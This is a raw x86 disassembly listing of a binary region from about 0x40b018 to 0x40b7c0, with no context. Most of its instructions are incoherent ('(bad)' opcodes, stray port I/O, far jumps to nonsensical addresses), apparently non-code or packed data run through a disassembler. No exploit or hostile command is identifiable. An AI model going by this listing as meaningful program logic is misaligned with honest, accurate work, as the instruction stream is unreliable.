  40b018:	sub    BYTE PTR [ecx-0x225303ea],bh
  40b01e:	scas   eax,DWORD PTR es:[edi]
  40b01f:	inc    ebx
  40b020:	sbb    eax,0xc525ab37
  40b025:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b026:	lock fadd st(3),st
  40b029:	xchg   esp,eax
  40b02a:	sub    al,0x4a
  40b02c:	ins    BYTE PTR es:[edi],dx
  40b02d:	xor    al,BYTE PTR [ecx-0x3a247ac6]
  40b033:	pop    edx
  40b034:	push   es
  40b035:	sub    DWORD PTR ds:0x7210b406,ebx
  40b03b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b03c:	stc    
  40b03d:	mov    ds,esi
  40b03f:	test   BYTE PTR [eax-0x4d],0xe0
  40b043:	das    
  40b044:	in     al,dx
  40b045:	xchg   edi,eax
  40b046:	test   BYTE PTR [ecx],cl
  40b048:	cdq    
  40b049:	cmp    BYTE PTR [edx],dl
  40b04b:	xor    bl,BYTE PTR [esi-0x2bbbaaae]
  40b051:	fnstenv [ebx-0x6aaff15c]
  40b057:	and    eax,0x78b0e152
  40b05c:	ror    BYTE PTR [edi+ebp*8],cl
  40b05f:	fnsave [esp+ebp*4]
  40b062:	aam    0xe0
  40b064:	lods   eax,DWORD PTR ds:[esi]
  40b065:	jmp    0xb5b9f1c1
  40b06a:	xor    bl,ch
  40b06c:	nop
  40b06d:	push   edx
  40b06e:	push   esp
  40b06f:	fcompp 
  40b071:	out    dx,eax
  40b072:	push   cs
  40b073:	ds pop ecx
  40b075:	stc    
  40b076:	ins    DWORD PTR es:[edi],dx
  40b077:	pop    eax
  40b078:	xchg   BYTE PTR [ecx-0x55],bh
  40b07b:	mov    fs,WORD PTR [esi+0xb]
  40b07e:	sub    esi,edi
  40b080:	vpmacssdql ymm8,ymm4,ymm0,YMMWORD PTR fs:[ecx-0x1ff1c33]
  40b08b:	mov    ds:0x4baeebc,eax
  40b090:	push   0xe8051141
  40b095:	xchg   esp,eax
  40b096:	stos   BYTE PTR es:[edi],al
  40b097:	xchg   esi,eax
  40b098:	inc    ebx
  40b099:	popf   
  40b09a:	test   eax,0x4e916409
  40b09f:	clc    
  40b0a0:	pop    es
  40b0a1:	aas    
  40b0a2:	daa    
  40b0a3:	test   DWORD PTR [ecx],ebp
  40b0a5:	outs   dx,BYTE PTR ds:[esi]
  40b0a6:	jmp    0x40b078
  40b0a8:	les    ebp,FWORD PTR ds:0x4b2ce417
  40b0ae:	inc    ebp
  40b0af:	sub    al,0x56
  40b0b1:	and    al,0xc0
  40b0b3:	mov    edi,0x199c1db3
  40b0b8:	add    eax,0x9b8733d5
  40b0bd:	leave  
  40b0be:	mov    al,ds:0xe8b9f6b2
  40b0c3:	fdivr  QWORD PTR [ecx]
  40b0c5:	xchg   ebx,eax
  40b0c6:	xchg   BYTE PTR [eax+0x1e],ch
  40b0c9:	push   ebp
  40b0ca:	fsubr  st(5),st
  40b0cc:	and    edx,eax
  40b0ce:	sub    al,0x5d
  40b0d0:	mov    al,0x1b
  40b0d2:	stos   DWORD PTR es:[edi],eax
  40b0d3:	cmp    esp,DWORD PTR [ebx-0x6aff743c]
  40b0d9:	les    esp,FWORD PTR [esi+0x36]
  40b0dc:	addr16 sub eax,0xc8212c76
  40b0e2:	fnsave ds:0xd78b06bb
  40b0e8:	push   0xffffffd9
  40b0ea:	ins    DWORD PTR es:[edi],dx
  40b0eb:	ret    0x3f23
  40b0ee:	pop    esi
  40b0ef:	es (bad) 
  40b0f1:	daa    
  40b0f2:	mov    DWORD PTR [eax],esi
  40b0f4:	cdq    
  40b0f5:	xor    BYTE PTR [ecx-0x43f7e9d8],cl
  40b0fb:	xor    DWORD PTR cs:[edx-0x260edcfd],0x73
  40b103:	push   0xcf286334
  40b108:	cmp    DWORD PTR [ebp-0x3dcc324b],ebx
  40b10e:	out    0x8c,eax
  40b110:	xchg   ebx,eax
  40b111:	add    ebp,DWORD PTR ss:[eax+0x7a]
  40b115:	ss scas al,BYTE PTR es:[edi]
  40b117:	(bad)  
  40b119:	enter  0x5907,0x31
  40b11d:	clc    
  40b11e:	repz push ebp
  40b120:	sub    eax,0x2fae7d3f
  40b125:	push   cs
  40b126:	clc    
  40b127:	adc    esp,DWORD PTR [ecx]
  40b129:	mov    dh,0x35
  40b12b:	fld    TBYTE PTR [eax+0x2d]
  40b12e:	cdq    
  40b12f:	loop   0x40b11e
  40b131:	lods   al,BYTE PTR ds:[esi]
  40b132:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b133:	fucomp st(5)
  40b135:	xchg   BYTE PTR [ebp+0x1b],dh
  40b138:	push   ecx
  40b139:	jge    0x40b17d
  40b13b:	or     esp,DWORD PTR [esi]
  40b13d:	lahf   
  40b13e:	push   es
  40b13f:	das    
  40b140:	test   DWORD PTR [edi+0x61],ebp
  40b143:	sbb    BYTE PTR [ecx],al
  40b145:	(bad)  
  40b146:	stc    
  40b147:	add    edi,DWORD PTR [ebx+0x68f650a5]
  40b14d:	jno    0x40b108
  40b14f:	loope  0x40b172
  40b151:	loopne 0x40b0f6
  40b153:	xor    eax,0xb6fab050
  40b158:	cmp    DWORD PTR [ebx-0x350bdfe],eax
  40b15e:	pop    ecx
  40b15f:	dec    esi
  40b160:	or     al,0xff
  40b162:	and    bl,dl
  40b164:	jno    0x40b15c
  40b166:	int    0x62
  40b168:	rcr    BYTE PTR [esi+ecx*2],cl
  40b16b:	scas   eax,DWORD PTR es:[edi]
  40b16c:	dec    esp
  40b16d:	mov    ds:0x9deda2ff,eax
  40b172:	gs dec edx
  40b174:	jge    0x40b1d5
  40b176:	call   0xa6c6:0x8777c215
  40b17d:	mov    edi,0x4a0ded9d
  40b182:	stc    
  40b183:	dec    edi
  40b184:	push   esp
  40b185:	cmp    bh,BYTE PTR [ecx]
  40b187:	(bad)  
  40b188:	repz pop edx
  40b18a:	ins    BYTE PTR es:[edi],dx
  40b18b:	pop    esi
  40b18c:	sbb    ah,BYTE PTR [ebx-0x52aaa363]
  40b192:	aam    0x66
  40b194:	pop    edi
  40b195:	mov    gs,WORD PTR [edi]
  40b197:	mov    edi,0x91b0ac4b
  40b19c:	jmp    0x2b93:0x68647e55
  40b1a3:	push   esi
  40b1a4:	sar    WORD PTR ds:0x55cc2ab0,cl
  40b1ab:	mov    BYTE PTR [ebx],bl
  40b1ad:	or     eax,0x87ea5884
  40b1b2:	inc    ebp
  40b1b3:	int    0x80
  40b1b5:	inc    ebx
  40b1b6:	mov    al,bh
  40b1b8:	frstor [eax+0x23c71c07]
  40b1be:	in     eax,0x4c
  40b1c0:	sahf   
  40b1c1:	cli    
  40b1c2:	mov    dl,bh
  40b1c4:	bound  esi,QWORD PTR [ebx-0x243e2f1b]
  40b1ca:	xchg   esp,eax
  40b1cb:	mov    esp,0x6d54c132
  40b1d0:	clc    
  40b1d1:	(bad)  [ecx-0x46]
  40b1d4:	inc    esi
  40b1d5:	adc    BYTE PTR [esi+esi*1-0x14646a39],ch
  40b1dc:	jge    0x40b1b9
  40b1de:	ss retf 
  40b1e0:	je     0x40b1bb
  40b1e2:	inc    esi
  40b1e3:	sbb    eax,0xd322bd6c
  40b1e8:	adc    al,0xb4
  40b1ea:	mov    ds:0xecda4fa,eax
  40b1ef:	shr    esp,0x3b
  40b1f2:	push   0x9014538d
  40b1f7:	test   al,0x15
  40b1f9:	int    0x46
  40b1fb:	dec    ebp
  40b1fc:	and    ch,BYTE PTR [esi-0x80]
  40b1ff:	sub    BYTE PTR [eax],dl
  40b201:	nop
  40b202:	pop    esi
  40b203:	xor    bl,dl
  40b205:	in     eax,0x59
  40b207:	mov    ecx,0xccb241d6
  40b20c:	cs dec esp
  40b20e:	or     al,0x2a
  40b210:	cmp    eax,0x2d8c620b
  40b215:	dec    ecx
  40b216:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b217:	mov    esi,edx
  40b219:	(bad)  
  40b21a:	jne    0x40b280
  40b21c:	push   cs
  40b21d:	add    ch,BYTE PTR [eax]
  40b21f:	mov    esp,0x849a2b68
  40b224:	cld    
  40b225:	push   0xffffffaa
  40b227:	retf   
  40b228:	xchg   ebx,eax
  40b229:	jecxz  0x40b203
  40b22b:	lods   al,BYTE PTR ds:[esi]
  40b22c:	pop    edi
  40b22d:	imul   edx,DWORD PTR [ebp-0x32],0xdabeef08
  40b234:	push   eax
  40b235:	retfw  
  40b237:	mov    BYTE PTR [edx+0x19],0xd8
  40b23b:	cmp    bl,BYTE PTR [ebx+0x83b8768]
  40b241:	(bad)  
  40b242:	in     eax,0xcb
  40b244:	fwait
  40b245:	cmp    dh,cl
  40b247:	push   di
  40b249:	stc    
  40b24a:	jg     0x40b2aa
  40b24c:	int3   
  40b24d:	jns    0x40b28f
  40b24f:	sub    al,0x97
  40b251:	mov    al,0x16
  40b253:	mov    al,0xcf
  40b255:	call   0x553a1da7
  40b25a:	sbb    ecx,eax
  40b25c:	or     dl,BYTE PTR [ecx+0x3a]
  40b25f:	mov    eax,ds:0xb33e4a5b
  40b264:	add    DWORD PTR [edx-0x5ad8afd],edi
  40b26a:	ret    
  40b26b:	mov    esp,0x3d128bd1
  40b270:	adc    eax,0x39b5c5a5
  40b275:	js     0x40b2c5
  40b277:	mov    dl,0xc0
  40b279:	dec    edi
  40b27a:	jbe    0x40b28c
  40b27c:	cs (bad) 
  40b27e:	or     al,0xe0
  40b280:	dec    ebp
  40b281:	test   BYTE PTR [ebx+eax*4+0x51],0xb5
  40b286:	inc    esi
  40b287:	sbb    ch,BYTE PTR [eax-0x6e]
  40b28a:	test   cl,dl
  40b28c:	test   BYTE PTR [ecx],al
  40b28e:	sub    dl,BYTE PTR [edi-0x2a]
  40b291:	sub    al,0x25
  40b293:	sub    dl,BYTE PTR gs:[edi+eiz*4+0x19a78e7b]
  40b29b:	mov    ch,0x8a
  40b29d:	mov    dl,0x4
  40b29f:	mov    edx,esi
  40b2a1:	(bad)  
  40b2a3:	add    ebx,DWORD PTR [ebp+0x6a8382c1]
  40b2a9:	mov    cl,0x13
  40b2ab:	sbb    dl,BYTE PTR [edx]
  40b2ad:	xor    eax,0x2028a474
  40b2b2:	jmp    0xa708:0x31b77963
  40b2b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b2ba:	cmp    eax,0x82927a76
  40b2bf:	jmp    0x40b5d8
  40b2c4:	rol    al,cl
  40b2c6:	(bad)  
  40b2c7:	leave  
  40b2c8:	fcmove st,st(1)
  40b2ca:	rcl    edi,1
  40b2cc:	pop    ss
  40b2cd:	mov    ecx,0xcdb9b132
  40b2d2:	lds    ebx,FWORD PTR [edx+0x78788ace]
  40b2d8:	je     0x40b358
  40b2da:	js     0x40b354
  40b2dc:	outs   dx,BYTE PTR ds:[esi]
  40b2dd:	mov    ebx,0x2eb26243
  40b2e2:	addr16 jmp 0xcc0bc47d
  40b2e8:	sbb    esi,DWORD PTR [ecx+0x696659a3]
  40b2ee:	sub    DWORD PTR [ecx],ebp
  40b2f0:	int3   
  40b2f1:	inc    eax
  40b2f2:	pop    ebp
  40b2f3:	out    0xb2,al
  40b2f5:	sub    DWORD PTR [ecx+0x2ffeebbf],eax
  40b2fb:	xchg   ecx,eax
  40b2fc:	push   cs
  40b2fd:	jecxz  0x40b306
  40b2ff:	adc    eax,0x8b1c9a76
  40b304:	les    esi,FWORD PTR [edi+0x41a167b9]
  40b30a:	fwait
  40b30b:	aad    0x42
  40b30d:	cmp    al,0x7c
  40b30f:	sub    esp,0x32
  40b312:	call   FWORD PTR [ebx-0xc150ce3]
  40b318:	or     eax,0xc1feb9c5
  40b31d:	push   0x32
  40b31f:	jmp    0x64f6ee38
  40b324:	lahf   
  40b325:	outs   dx,DWORD PTR ds:[esi]
  40b326:	sbb    DWORD PTR [ebx+0x598a997d],0x54b70581
  40b330:	pop    ss
  40b331:	popf   
  40b332:	mov    eax,0x43ba0a3
  40b337:	mov    ds:0x9a0d4dce,al
  40b33c:	loopne 0x40b333
  40b33e:	push   esi
  40b33f:	pop    ecx
  40b340:	push   es
  40b341:	fmul   QWORD PTR [eax]
  40b343:	pop    eax
  40b344:	push   eax
  40b345:	bound  esi,QWORD PTR [esi-0x25]
  40b348:	jmp    0x8ff3:0xd7bd6f83
  40b34f:	test   DWORD PTR [eax],edi
  40b351:	arpl   WORD PTR [eax],ax
  40b353:	adc    ah,BYTE PTR [edx]
  40b355:	sub    DWORD PTR [edi+0x28],ebp
  40b358:	xchg   edx,eax
  40b359:	xor    al,0x81
  40b35b:	lahf   
  40b35c:	mov    dl,0x70
  40b35e:	sub    DWORD PTR [edx],ebx
  40b360:	inc    esi
  40b361:	popa   
  40b362:	jmp    0x40b36d
  40b364:	jg     0x40b2ea
  40b366:	pop    ebx
  40b367:	ret    
  40b368:	add    bh,BYTE PTR [ebx]
  40b36a:	in     eax,dx
  40b36b:	leave  
  40b36c:	and    eax,0x21316ac6
  40b371:	jmp    0x5103:0x6dad5ab3
  40b378:	shl    BYTE PTR [eax+edx*8],1
  40b37b:	(bad)  
  40b37c:	or     eax,0xdceab3c7
  40b381:	jecxz  0x40b313
  40b383:	jecxz  0x40b3a9
  40b385:	lahf   
  40b386:	mov    dh,0x15
  40b388:	pop    ecx
  40b389:	hlt    
  40b38a:	or     eax,0xaa26bb02
  40b38f:	mov    BYTE PTR [eax-0x7d],bh
  40b392:	and    ebp,DWORD PTR [ebx+0x5e1be3c5]
  40b398:	sub    esi,ebx
  40b39a:	fnsetpm(287 only) 
  40b39c:	jbe    0x40b3ed
  40b39e:	inc    ebp
  40b39f:	jmp    FWORD PTR [ebp-0x412de950]
  40b3a5:	push   ebx
  40b3a6:	in     al,0xe6
  40b3a8:	pop    edx
  40b3a9:	in     al,dx
  40b3aa:	dec    esp
  40b3ab:	out    dx,eax
  40b3ac:	mov    al,0x28
  40b3ae:	lea    esi,[ecx-0x602f82e]
  40b3b4:	adc    al,0x3c
  40b3b6:	into   
  40b3b7:	hlt    
  40b3b8:	mov    al,0x6d
  40b3ba:	mov    ah,BYTE PTR [ebx+0x70f1f31]
  40b3c0:	cdq    
  40b3c1:	imul   ebp,DWORD PTR [edi-0x1a92938d],0xffffffb2
  40b3c8:	lock lahf 
  40b3ca:	xchg   ecx,eax
  40b3cb:	ret    
  40b3cc:	into   
  40b3cd:	or     esi,DWORD PTR [ecx-0x32]
  40b3d0:	or     BYTE PTR [ebx+eax*8-0x6f],cl
  40b3d4:	sbb    bh,BYTE PTR [eax+0x733203e5]
  40b3da:	or     BYTE PTR cs:[ebp-0x21],bl
  40b3de:	and    bl,BYTE PTR [ebp-0x41d7ea17]
  40b3e4:	inc    edi
  40b3e5:	pop    esp
  40b3e6:	push   0xffffffe2
  40b3e8:	cmp    dh,BYTE PTR es:[ebp-0x2b]
  40b3ec:	push   ebp
  40b3ed:	sti    
  40b3ee:	xor    ebx,edi
  40b3f0:	mov    bh,0x3
  40b3f2:	or     eax,0x5563abf7
  40b3f7:	and    edx,ebp
  40b3f9:	and    ebx,esi
  40b3fb:	in     eax,0x82
  40b3fd:	ret    
  40b3fe:	and    dh,0x9
  40b401:	mov    ds:0x1be3408a,eax
  40b406:	daa    
  40b407:	mov    bl,0x7
  40b409:	fnstsw WORD PTR [edx+0x7f]
  40b40c:	mov    ebp,cs
  40b40e:	pop    ss
  40b40f:	fmul   st(0),st
  40b411:	icebp  
  40b412:	hlt    
  40b413:	cli    
  40b414:	js     0x40b457
  40b416:	bound  edi,QWORD PTR [edi-0x700fad34]
  40b41c:	push   ecx
  40b41d:	mov    bh,0x22
  40b41f:	mov    ecx,0x913bbc35
  40b424:	push   ebp
  40b425:	cwde   
  40b426:	call   FWORD PTR [esi-0x59]
  40b429:	ss add dh,cl
  40b42c:	cdq    
  40b42d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b42e:	(bad)  
  40b430:	cdq    
  40b431:	dec    ecx
  40b432:	xchg   DWORD PTR [ecx+0x35],ebx
  40b435:	dec    ebx
  40b436:	loope  0x40b430
  40b438:	js     0x40b438
  40b43a:	or     al,0x7a
  40b43c:	and    eax,0xf34a28a1
  40b441:	jp     0x40b413
  40b443:	retf   
  40b444:	fild   WORD PTR [edx+0xdcf938d]
  40b44a:	pop    edi
  40b44b:	shl    BYTE PTR [esi+ebx*2+0x1ada6475],1
  40b452:	test   DWORD PTR [eax-0x53ec4d78],0x282dd7d8
  40b45c:	and    DWORD PTR [edx-0x57348136],ebx
  40b462:	mov    edx,0xc1adedf3
  40b467:	outs   dx,DWORD PTR ds:[esi]
  40b468:	xchg   ecx,eax
  40b469:	or     BYTE PTR [edx+0x8],0xa6
  40b46d:	cs stos BYTE PTR es:[edi],al
  40b46f:	push   DWORD PTR [eax+ecx*2]
  40b472:	pushf  
  40b473:	jl     0x40b4a6
  40b475:	cmp    eax,0x2a21e351
  40b47a:	shr    DWORD PTR [edi+ecx*2+0x225588c4],1
  40b481:	ds in  al,dx
  40b483:	mov    esi,0x374d0fbe
  40b488:	xchg   edi,eax
  40b489:	xor    ebx,ecx
  40b48b:	fstp   DWORD PTR ds:0xc23e21fb
  40b491:	ds clc 
  40b493:	add    al,al
  40b495:	shl    ah,1
  40b497:	and    edi,DWORD PTR [ebx]
  40b499:	jecxz  0x40b458
  40b49b:	ror    DWORD PTR [edi+ebp*4],cl
  40b49e:	rcr    BYTE PTR [edx-0x3],cl
  40b4a1:	add    BYTE PTR [edi+0x17],ah
  40b4a4:	neg    DWORD PTR [eax+0x11]
  40b4a7:	jnp    0x40b476
  40b4a9:	xchg   DWORD PTR [esp+edx*8-0x41035b],esp
  40b4b0:	lods   al,BYTE PTR ds:[esi]
  40b4b1:	xor    edx,DWORD PTR [ebx]
  40b4b3:	fiadd  WORD PTR [eax-0x5d]
  40b4b6:	fincstp 
  40b4b8:	cmp    bh,BYTE PTR [eax-0x6acaa57c]
  40b4be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b4bf:	jbe    0x40b4a5
  40b4c1:	dec    esp
  40b4c2:	pop    eax
  40b4c3:	cwde   
  40b4c4:	fwait
  40b4c5:	stos   DWORD PTR es:[edi],eax
  40b4c6:	sbb    BYTE PTR [eax+0x43c3b5c8],dh
  40b4cc:	das    
  40b4cd:	std    
  40b4ce:	or     al,0xa
  40b4d0:	test   DWORD PTR [edx-0x2bf7723e],ebp
  40b4d6:	pop    eax
  40b4d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b4d8:	dec    BYTE PTR [eax+0x75c8faa4]
  40b4de:	daa    
  40b4df:	test   DWORD PTR [ecx-0x1b15a5d2],esi
  40b4e5:	or     al,0xe1
  40b4e7:	jge    0x40b4d2
  40b4e9:	in     al,dx
  40b4ea:	add    ecx,DWORD PTR [eax+0x3c]
  40b4ed:	dec    ebx
  40b4ee:	ins    DWORD PTR es:[edi],dx
  40b4ef:	xchg   ebp,eax
  40b4f0:	ret    0x7a28
  40b4f3:	enter  0x75e8,0x52
  40b4f7:	cmp    al,0xf1
  40b4f9:	sbb    ah,cl
  40b4fb:	xor    eax,0x2b40f215
  40b500:	fld    st(7)
  40b502:	adc    DWORD PTR [ebx+0x7608bd42],edx
  40b508:	cdq    
  40b509:	mov    dx,0xc040
  40b50d:	mov    esi,0x4d7e4d47
  40b512:	js     0x40b582
  40b514:	sbb    BYTE PTR [ebx],bh
  40b516:	popa   
  40b517:	jns    0x40b4af
  40b519:	push   edx
  40b51a:	(bad)  
  40b51b:	repz ret 0xb57d
  40b51f:	push   ds
  40b520:	cmp    ebx,DWORD PTR [eax]
  40b522:	lahf   
  40b523:	cld    
  40b524:	jmp    0xbea8:0xdc87c017
  40b52b:	jns    0x40b4cc
  40b52d:	call   0x18b473e3
  40b532:	pop    ebx
  40b533:	ret    
  40b534:	nop
  40b535:	or     eax,ebp
  40b537:	and    DWORD PTR [eax-0x2345b220],edi
  40b53d:	push   0xdf06a4c1
  40b542:	mov    eax,0x1e0e7bd
  40b547:	cmp    BYTE PTR [edx-0x69],dh
  40b54a:	jnp    0x40b55a
  40b54c:	leave  
  40b54d:	test   ch,dl
  40b54f:	push   0xc5661ea4
  40b554:	mov    ds:0xe03b9dde,eax
  40b559:	jg     0x40b4f6
  40b55b:	test   al,0x87
  40b55d:	inc    ecx
  40b55e:	inc    ebp
  40b55f:	jp     0x40b578
  40b561:	ss nop
  40b563:	mov    esi,0x476467d3
  40b568:	aas    
  40b569:	arpl   bp,cx
  40b56b:	xor    BYTE PTR [ebx],dh
  40b56d:	mov    ecx,0xc0eece8e
  40b572:	mov    esi,edi
  40b574:	aas    
  40b575:	cmp    al,0xe4
  40b577:	xor    eax,ecx
  40b579:	push   edi
  40b57a:	inc    ebp
  40b57b:	out    0xcf,eax
  40b57d:	aad    0x3e
  40b57f:	cld    
  40b580:	out    dx,al
  40b581:	jmp    0x40b57b
  40b583:	xchg   ebp,eax
  40b584:	pop    es
  40b585:	int3   
  40b586:	popf   
  40b587:	loop   0x40b59a
  40b589:	repz sub eax,DWORD PTR [ecx-0x1993fb49]
  40b590:	bound  edi,QWORD PTR [edx]
  40b592:	out    0x6b,al
  40b594:	mov    ch,0xc
  40b596:	aad    0xb3
  40b598:	push   ds
  40b599:	adc    cl,BYTE PTR [ebp+0x40]
  40b59c:	cs sub ecx,0x5e11dc2b
  40b5a3:	push   edi
  40b5a4:	fiadd  WORD PTR [ebp+0x580e0c1]
  40b5aa:	adc    BYTE PTR [ebx+ecx*2],0x21
  40b5ae:	(bad)  
  40b5af:	sbb    eax,DWORD PTR [edx]
  40b5b1:	jae    0x73babb1
  40b5b7:	adc    al,0x4a
  40b5b9:	fs inc ebx
  40b5bb:	sub    ebp,esi
  40b5bd:	fcomi  st,st(5)
  40b5bf:	outs   dx,BYTE PTR ds:[esi]
  40b5c0:	daa    
  40b5c1:	les    edi,FWORD PTR [ebx]
  40b5c3:	inc    esp
  40b5c4:	xor    DWORD PTR ds:0x63507bcc,edx
  40b5ca:	aam    0x71
  40b5cc:	scas   eax,DWORD PTR es:[edi]
  40b5cd:	xchg   ebp,eax
  40b5ce:	jle    0x40b597
  40b5d0:	shl    DWORD PTR [ecx+0x3d12d18b],0xf3
  40b5d7:	test   eax,0x17840f
  40b5dc:	add    BYTE PTR [eax],al
  40b5de:	mov    eax,DWORD PTR [ebp-0x1c]
  40b5e1:	or     DWORD PTR [eax],0x60751c9d
  40b5e7:	mov    eax,DWORD PTR [ebp-0x8]
  40b5ea:	xor    eax,ecx
  40b5ec:	add    eax,esi
  40b5ee:	pop    edi
  40b5ef:	pop    esi
  40b5f0:	pop    ebx
  40b5f1:	leave  
  40b5f2:	ret    0x4
  40b5f5:	mov    eax,DWORD PTR [ebp-0xc]
  40b5f8:	add    eax,DWORD PTR [ebp-0x18]
  40b5fb:	jmp    0x40b914
  40b600:	leave  
  40b601:	xlat   BYTE PTR ds:[ebx]
  40b602:	ret    
  40b603:	rcl    cl,0xd4
  40b606:	leave  
  40b607:	fldcw  WORD PTR [esi+0x73ccd584]
  40b60d:	mov    eax,ds:0x8fca727b
  40b612:	js     0x40b68c
  40b614:	je     0x40b694
  40b616:	js     0x40b690
  40b618:	dec    ecx
  40b619:	(bad)  
  40b61a:	pop    ebp
  40b61b:	adc    dl,BYTE PTR [esp-0x309ec9]
  40b622:	xchg   esi,eax
  40b623:	mov    ebx,DWORD PTR [edi+0xe]
  40b626:	or     eax,0xe2e33456
  40b62b:	pop    ss
  40b62c:	dec    edx
  40b62d:	es imul ebx,ebp,0x37
  40b631:	adc    eax,0xacef0bb4
  40b636:	outs   dx,BYTE PTR ds:[esi]
  40b637:	(bad)  
  40b638:	sahf   
  40b639:	sbb    al,0x62
  40b63b:	out    dx,eax
  40b63c:	inc    esp
  40b63d:	mov    edi,0x35a3818f
  40b642:	push   es
  40b643:	mov    ds:0xb6a1ebe,eax
  40b648:	lahf   
  40b649:	pop    ebp
  40b64a:	dec    esi
  40b64b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b64c:	mov    BYTE PTR [ebp-0x13],cl
  40b64f:	or     DWORD PTR [esi+ecx*1+0x5e],0xffffff83
  40b654:	mov    ah,0x8e
  40b656:	pop    es
  40b657:	mov    WORD PTR [ecx+0x67655662],ds
  40b65d:	jae    0x40b656
  40b65f:	out    dx,eax
  40b660:	jnp    0x40b5fc
  40b662:	arpl   WORD PTR [eax-0x14],sp
  40b665:	das    
  40b666:	sub    ebx,edi
  40b668:	pop    edx
  40b669:	pop    es
  40b66a:	into   
  40b66b:	mov    DWORD PTR [edi+0xa747304],ecx
  40b671:	arpl   di,ax
  40b673:	aaa    
  40b674:	int    0x5c
  40b676:	sbb    DWORD PTR ds:0x4e208b48,edi
  40b67c:	adc    al,0xd6
  40b67e:	sub    DWORD PTR [eax],edi
  40b680:	inc    ebx
  40b681:	xor    bh,bl
  40b683:	hlt    
  40b684:	les    esp,FWORD PTR [eax]
  40b686:	mov    esp,0xe5540c0b
  40b68c:	les    ebx,FWORD PTR [ebx+0x37]
  40b68f:	adc    BYTE PTR ds:0x58a867d0,ah
  40b695:	ret    0xb12
  40b698:	mov    esp,0x9fab12ed
  40b69d:	mov    dl,0xb0
  40b69f:	xchg   edx,eax
  40b6a0:	std    
  40b6a1:	pop    eax
  40b6a2:	jns    0x40b6e7
  40b6a4:	add    DWORD PTR [eax-0x35],ebp
  40b6a7:	lea    edi,[ebx]
  40b6a9:	enter  0x997f,0x2b
  40b6ad:	(bad)  
  40b6ae:	aad    0xed
  40b6b0:	popf   
  40b6b1:	mov    esi,0xbd95d4cb
  40b6b6:	lods   eax,DWORD PTR ds:[esi]
  40b6b7:	pop    eax
  40b6b8:	sub    BYTE PTR [ecx],ch
  40b6ba:	int3   
  40b6bb:	sahf   
  40b6bc:	cmp    BYTE PTR [edi-0x63],bl
  40b6bf:	pushf  
  40b6c0:	test   eax,0x98949c9c
  40b6c5:	rcl    BYTE PTR [eax+0x34],1
  40b6c8:	loopne 0x40b66a
  40b6ca:	mov    al,0x64
  40b6cc:	leave  
  40b6cd:	dec    ebp
  40b6ce:	xor    edx,0x1ee50c94
  40b6d4:	mov    bh,0x31
  40b6d6:	icebp  
  40b6d7:	ror    DWORD PTR ds:0xb84f484a,cl
  40b6dd:	lock or BYTE PTR [edi-0x14],bl
  40b6e1:	jge    0x40b6cc
  40b6e3:	enter  0xf29f,0xd3
  40b6e7:	shl    DWORD PTR [ecx-0x1c898b12],cl
  40b6ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b6ee:	inc    edi
  40b6ef:	retf   0xacb5
  40b6f2:	mov    ds,WORD PTR [eax+0x3f764676]
  40b6f8:	ret    
  40b6f9:	cld    
  40b6fa:	ins    BYTE PTR es:[edi],dx
  40b6fb:	or     al,0x45
  40b6fd:	daa    
  40b6fe:	ja     0x40b6ae
  40b700:	jb     0x40b749
  40b702:	cdq    
  40b703:	push   cs
  40b704:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b705:	shr    al,0x6e
  40b708:	xor    dl,BYTE PTR [eax+ebp*2]
  40b70b:	fadd   DWORD PTR [eax-0x4cd6e605]
  40b711:	test   al,0x76
  40b713:	jno    0x40b74f
  40b715:	push   ebp
  40b716:	jle    0x40b728
  40b718:	dec    ecx
  40b719:	mov    ch,0xb6
  40b71b:	jle    0x40b738
  40b71d:	mov    cl,0xa
  40b71f:	jmp    0x40b6c3
  40b721:	imul   ebp,DWORD PTR fs:[edx+0x65],0xb1416544
  40b729:	xor    dh,BYTE PTR [esi]
  40b72b:	retf   0xa4ea
  40b72e:	mov    esp,0x92520342
  40b733:	test   DWORD PTR [edi],edi
  40b735:	std    
  40b736:	fimul  DWORD PTR [eax-0x2e]
  40b739:	sub    eax,0x875cd3b5
  40b73e:	jbe    0x40b727
  40b740:	sbb    BYTE PTR [ebp+ecx*4+0x3e],ch
  40b744:	mov    eax,0x7496549
  40b749:	sub    ecx,DWORD PTR es:[edi+esi*2-0x81261f9]
  40b751:	push   esi
  40b752:	pop    ecx
  40b753:	pop    edi
  40b754:	cs in  eax,dx
  40b756:	sar    DWORD PTR [edi+esi*8+0x19],1
  40b75a:	jmp    0xab5397cd
  40b75f:	add    cl,BYTE PTR cs:[ebx]
  40b762:	add    edx,esi
  40b764:	test   al,0x53
  40b766:	jle    0x40b7d9
  40b768:	and    BYTE PTR [edi],dh
  40b76a:	mov    dl,0x86
  40b76c:	mov    gs,WORD PTR [edx-0xd27041a]
  40b772:	ficomp DWORD PTR [ebx+0x1a]
  40b775:	mov    esp,0x435d2d60
  40b77a:	fadd   DWORD PTR [esi-0x5c3065b5]
  40b780:	xor    ch,BYTE PTR [esi]
  40b782:	xor    DWORD PTR [edi+0x1e],esi
  40b785:	cmp    eax,esp
  40b787:	add    edi,DWORD PTR [edx-0x5e]
  40b78a:	(bad)  
  40b78b:	pop    edi
  40b78c:	push   0x144d2977
  40b791:	sti    
  40b792:	sub    BYTE PTR [esi+edx*2-0x6a],ch
  40b796:	repnz add BYTE PTR [edx],0x69
  40b79a:	mov    esp,DWORD PTR [ebx]
  40b79c:	daa    
  40b79d:	xor    cl,BYTE PTR [esp+esi*2+0xf8b6b30]
  40b7a4:	out    0xa9,eax
  40b7a6:	in     eax,0x20
  40b7a8:	add    DWORD PTR [edi+0x2b],ecx
  40b7ab:	icebp  
  40b7ac:	jmp    0x27e0:0xe7e6d8ee
  40b7b3:	sahf   
  40b7b4:	mov    ds:0xd71a76d6,eax
  40b7b9:	test   DWORD PTR [edi+0x39],esi
  40b7bc:	into   
  40b7bd:	pop    ebx
  40b7be:	ins    BYTE PTR es:[edi],dx
  40b7bf:	cwde   
  40b7c0:	xor    DWORD PTR [ecx-0x34],esp
